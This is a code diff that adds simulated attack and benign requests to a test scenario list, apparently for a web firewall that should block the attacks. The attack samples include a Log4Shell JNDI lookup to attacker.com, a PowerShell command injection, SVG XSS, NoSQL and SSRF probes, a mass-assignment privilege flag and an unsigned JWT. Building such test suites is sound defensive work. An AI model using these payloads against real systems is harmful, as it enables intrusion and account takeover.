@@ -137,5 +137,104 @@ export const SIM_SCENARIOS: SimulationScenario[] = [
     query: { q: "O'Brien Apparel" },
     description: 'Benign query with apostrophe correctly distinguished by parser without false positive',
     expectedAction: 'allowed'
+  },
+  {
+    id: 'sim-log4shell',
+    name: 'Log4Shell / JNDI Lookup Probe',
+    category: 'log4shell',
+    method: 'GET',
+    path: '/api/v1/resource',
+    clientIp: '45.33.22.11',
+    headers: { 'X-Api-Version': '${jndi:ldap://attacker.com/a}' },
+    description: 'Log4j JNDI injection probe targeting vulnerable logging frameworks',
+    expectedAction: 'blocked'
+  },
+  {
+    id: 'sim-bot-scan',
+    name: 'Automated Vulnerability Scan (sqlmap)',
+    category: 'scanner',
+    method: 'GET',
+    path: '/api/v1/products/search',
+    clientIp: '88.99.230.1',
+    headers: { 'User-Agent': 'sqlmap/1.4.12 (http://sqlmap.org)' },
+    description: 'Scanning bot activity detected via signature-based User-Agent inspection',
+    expectedAction: 'blocked'
+  },
+  {
+    id: 'sim-nosql-json',
+    name: 'NoSQL Operator Injection ($where)',
+    category: 'nosql',
+    method: 'POST',
+    path: '/api/v1/auth/login',
+    clientIp: '185.191.171.1',
+    body: { $where: 'function() { return true; }' },
+    description: 'Advanced NoSQL injection using functional operators to bypass logic',
+    expectedAction: 'blocked'
+  },
+  {
+    id: 'sim-cmdi-ps',
+    name: 'PowerShell Command Injection',
+    category: 'cmdi',
+    method: 'GET',
+    path: '/api/v1/resource',
+    clientIp: '2.56.12.188',
+    query: { id: '1; powershell.exe -ExecutionPolicy Bypass -File attacker.ps1' },
+    description: 'Windows-specific shell execution probe targeting PowerShell integration',
+    expectedAction: 'blocked'
+  },
+  {
+    id: 'sim-xss-svg',
+    name: 'XSS: SVG Image Payload',
+    category: 'xss',
+    method: 'POST',
+    path: '/api/feedback',
+    clientIp: '190.12.44.11',
+    body: { avatar: '<svg onload="alert(document.domain)">' },
+    description: 'XSS probe hiding malicious javascript inside SVG image tags',
+    expectedAction: 'blocked'
+  },
+  {
+    id: 'sim-ssrf-local',
+    name: 'SSRF: Localhost Port Probe',
+    category: 'ssrf',
+    method: 'GET',
+    path: '/api/v1/resource',
+    clientIp: '104.21.34.112',
+    query: { url: 'http://localhost:22' },
+    description: 'Probing internal server ports for service discovery and exfiltration',
+    expectedAction: 'blocked'
+  },
+  {
+    id: 'sim-mass-admin',
+    name: 'Mass Assignment: Admin Elevation',
+    category: 'mass_assignment',
+    method: 'PUT',
+    path: '/api/v1/user/profile',
+    clientIp: '81.16.222.1',
+    body: { bio: 'New bio', is_admin: true, isAdmin: 1 },
+    description: 'Attempting to elevate privileges by injecting hidden administrative flags',
+    expectedAction: 'blocked'
+  },
+  {
+    id: 'sim-jwt',
+    name: 'JWT Signature Bypass (None Algorithm)',
+    category: 'auth_bypass',
+    method: 'GET',
+    path: '/api/v1/user/profile',
+    clientIp: '190.115.22.4',
+    headers: { 'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaGFja2VyIn0.' },
+    description: 'Attempts to bypass authentication using a JWT with the "none" algorithm signature exploit',
+    expectedAction: 'blocked'
+  },
+  {
+    id: 'sim-benign-3',
+    name: 'Secure Checkout Transaction',
+    category: 'benign',
+    method: 'POST',
+    path: '/api/v1/checkout',
+    clientIp: '66.249.66.1',
+    body: { cart_id: 'CART-123', items: [1, 2], address: '123 Enterprise Way' },
+    description: 'Standard production checkout flow passing all contract validations',
+    expectedAction: 'allowed'
   }
 ];
